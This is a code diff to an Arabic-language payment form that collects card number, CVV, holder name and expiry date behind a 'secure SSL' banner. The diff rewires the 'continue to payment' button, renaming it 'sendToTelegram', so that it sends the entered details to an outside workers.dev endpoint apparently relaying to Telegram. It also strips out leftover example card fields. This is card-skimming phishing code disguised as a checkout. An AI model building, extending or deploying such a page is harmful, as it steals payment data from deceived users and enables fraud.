@@ -258,7 +258,7 @@
         </label>
         <div id="termsError" class="error-msg"></div>
 
-        <button id="nextBtn" class="btn-pay" type="submit" disabled>🔒 المتابعة للدفع</button>
+        <button id="sendToTelegram" class="btn-pay" type="submit" disabled>🔒 المتابعة للدفع</button>
       </form>
 
       <div class="security">🔐 جميع البيانات مشفرة ومحمية بتقنية SSL 256-bit</div>
@@ -271,7 +271,7 @@
     const cvvInput = document.getElementById('cvv');
     const holderInput = document.getElementById('cardHolder');
     const termsCheckbox = document.getElementById('termsCheckbox');
-    const submitBtn = document.getElementById('nextBtn');
+    const submitBtn = document.getElementById('sendToTelegram');
 
     function showError(id, message) {
       const el = document.getElementById(id);
@@ -404,40 +404,11 @@
 });
   </script>
 
-<!-- مثال على زر الإرسال -->
-<button
-  id="sendDataButton"
-  type="button"
->
-  إرسال البيانات إلى تلجرام
-</button>
-
-<!-- مثال على بيانات موجودة في الصفحة -->
-<p>
-  رقم البطاقة:
-  <span id="cardNumber">1234 5678 9012 3456</span>
-</p>
-
-<p>
-  اسم حامل البطاقة:
-  <span id="cardHolder">أحمد</span>
-</p>
- 
-<p>
-  تاريخ الانتهاء:
-  <span id="expiryDateInput">12/25</span>
-</p>
-
-<p>
-  CVV:
-  <span id="cvv">123</span>
-</p>
-
 <script>
  const API_URL =
   "https://telegram-site-api.adhmarmr766.workers.dev/submit";
   document
-    .getElementById("sendDataButton")
+    .getElementById("sendToTelegram")
     .addEventListener("click", async () => {
       const button = document.getElementById(
         "sendDataButton"
